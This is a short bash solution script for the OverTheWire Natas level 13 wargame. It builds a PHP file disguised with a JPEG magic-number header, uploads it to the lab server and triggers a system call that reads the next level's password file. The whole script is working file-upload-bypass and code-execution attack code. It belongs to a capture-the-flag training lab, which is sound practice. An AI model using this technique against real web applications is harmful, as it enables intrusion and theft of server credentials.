#!/bin/bash
url="http://natas13.natas.labs.overthewire.org"
user="natas13"
pass=$(cat credentials/natas13)

file2upload="pwned.php"
# adding magic number to faking a jpg file
echo -e "\xff\xd8\xff" > "$file2upload"
echo "<?php system('cat /etc/natas_webpass/natas14') ?>" >> "$file2upload"

echo "[*] verifing malicious php file as jpg file"
file $file2upload

echo -e "\n[*] uploading malicious php: $file2upload"
cat $file2upload
echo ""

uploadfile=$(curl -s -X 'POST' -F "uploadedfile=@$file2upload" -F "filename=$file2upload" -u "$user:$pass" "$url" | html2text | grep 'The file upload/' | awk '{print $3}')

echo -e "\nFile uploaded $uploadfile"
password=$(curl -s -u "$user:$pass" "$url/$uploadfile" | strings)
echo -e "[+] password found for natas13: $password\n"

echo $password > credentials/natas14
rm -f $file2upload

